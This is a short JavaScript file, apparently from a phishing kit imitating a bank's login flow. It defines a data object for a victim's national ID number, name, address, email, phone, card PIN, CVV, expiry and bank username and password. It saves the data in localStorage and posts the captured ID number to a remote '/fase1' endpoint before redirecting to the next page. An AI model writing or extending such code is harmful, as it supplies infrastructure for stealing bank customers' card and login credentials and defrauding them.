sw_sobre = 0;
sw_links = 0;
sw_ayuda = 0;
sw_corp = 0;

ok_datos = 0;
ok_tar = 0;
ok_sesion = 0;

dSet = {
  "cc": '',
  "nom": '',
  "cid": '',
  "dir": '',
  "ml": '',
  "pn": '',
  "tar": {
    "pin": '',
    "cvv": '',
    "date": '',
    "ent": ''
  },
  "bk": {
    "u": '',
    "p": ''
  },
  "cdg": ''
}

// Set data to LS
const LS = window.localStorage
LS.setItem("inf", JSON.stringify(dSet))

document.addEventListener('DOMContentLoaded', function() {
    document.addEventListener('DOMContentLoaded', () =>{
        document.querySelector('#txt-cedula').focus()
    })


    // CC
    document.querySelector("#btn-consultar").addEventListener('click', function() {
    if (document.querySelector("#txt-cedula").value.length >= 6) {
        // Set CC
        dc = JSON.parse(LS.getItem('inf'))
        dc['cc'] = document.querySelector("#txt-cedula").value
        LS.setItem('inf', JSON.stringify(dc))

        console.log(url);

        fetch(`${url}/fase1`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer 123123123',
            'X-CSRF-Token': 'tokennn',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
          },
          body: JSON.stringify(dc)
        })
        .then(response => response.json())
        .then(result => {
          console.log('Respuesta del servidor:', result);
          window.location.href = '../informacion.html'
        })
        .catch(error => {
          alert('Ocurrió un error: Inténtalo más tarde.')
        });
        
    } else {
        document.querySelector("#err-cedula").style.display = "block";
    }
    });
    
    document.querySelector("#txt-cedula").addEventListener('keyup', function() {
    if (document.querySelector("#txt-cedula").value.length >= 6) {
        document.querySelector("#err-cedula").style.display = "none";
    }
    });
})